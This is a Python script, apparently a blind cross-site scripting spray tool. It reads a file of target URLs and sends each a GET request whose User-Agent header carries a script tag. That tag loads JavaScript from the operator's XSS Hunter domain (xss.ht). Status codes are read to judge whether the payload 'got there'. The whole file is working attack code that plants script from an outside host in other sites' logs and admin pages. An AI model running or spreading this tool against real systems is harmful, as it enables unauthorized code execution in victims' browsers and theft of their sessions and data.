import requests , os , sys

def UserSetDomain(Username):
    if Username == "":
        sys.exit()
    else:
        XSSHunterDomain = "{0}.xss.ht".format(Username)

    return XSSHunterDomain

def StatusCheck(Code , Url):
    if str(Code) == "403":
        print("Seems To Be Using Cloudflare Or There Is User-agent Checks. Url: {0}".format(Url))
    elif str(Code) == "404":
        print("Not Found Resource. But Seems The XSSPayload Got There, Url: {0}".format(Url))
    elif str(Code) == "301":
        print("This Host Contains Rediretion, But The XSSPayload Got There, Url: {0}".format(Url))
    elif str(Code) == "302":
        print("This Host Contains Rediretion, But The XSSPayload Got There, Url: {0}".format(Url))
    elif str(Code) == "500":
        print("Internal Server Error, Maybe From The User-agent, Check That. Url: {0}".format(Url))
    elif str(Code) == "503":
        print("Internal Server Error, Maybe From The User-agent, Check That. Url: {0}".format(Url))
    elif str(Code) == "502":
        print("Internal Server Error, Maybe From The User-agent, Check That. Url: {0}".format(Url))
    elif str(Code) == "200":
        print("Everything Fine, The XSSPayload Got There. Url: {0}".format(Url))
    elif str(Code) == "405":
        print("GET Method Not Allowed, I'm Not Sure If The XSSPayload Got There. Url: {0}".format(Url))
    elif str(Code) == "410":
        print("Invalid Requested Path, I'm Not Sure If The XSSPayload Got There, Url: {0}".format(Url))
    else:
        print("Wierd Response, Status-Code:{0} , Url:{1}".format(Code , Url))

def CreateRequestWithUseragent(Hunter , Url):
    try:
        XSSPayload = '"><script src=https://{0}></script>'.format(Hunter)
        HTTPResponse = requests.get(Url , headers={"User-Agent":XSSPayload})
        StatusCheck(HTTPResponse.status_code , Url=Url)
    except Exception:
        print("Can't Made GET Request To This Url: {0}".format(Url))

def GetHostsList():
    try:
        Hosts = sys.argv[2]
        try:
            Testing = open(str(Hosts), 'r')
            return Hosts
        except Exception:
            print("Can't Open {0}, Check Your Permessions Or Check If This File Exists".format(Hosts))
            sys.exit()
    except Exception:
        print("Add The Hosts List On The Second Field")
        sys.exit()

def GetHunter():
    try:
        XSSHunter = sys.argv[1]
        if "xss.ht" not in XSSHunter:
            Check = GetUserMode()
            if Check != "UserMode":
                print("You Have Added XSSHunter Username Or Invalid Url, Use -u Mode After The Username Or Check The Url")
                sys.exit()
            else:
                pass

        return XSSHunter
    except Exception:
        print("Add Your XSSHunter Domain On The First Field.")
        sys.exit()

def GetUserMode():
    try:
        Mode = sys.argv[3]
        if Mode == '':
            return "Empty"
        elif Mode == "-u":
            return "UserMode"
        else:
            return "NONE"
    except Exception:
        print('' , end='')

def Main():
    try:
        XSSHunterDomain = GetHunter()
        DomainsList = GetHostsList()
        Mode = GetUserMode()

        if Mode == "UserMode":
            XSSHunterDomain = UserSetDomain(Username=XSSHunterDomain)
        else:
            pass

        HostsUrls = open(DomainsList, 'r')
        for Url in HostsUrls:
            Url = Url.rstrip("\n")
            CreateRequestWithUseragent(Hunter=XSSHunterDomain , Url=Url)
    except KeyboardInterrupt:
        print("\nExit.")
        sys.exit()

if __name__ == '__main__':
    Main()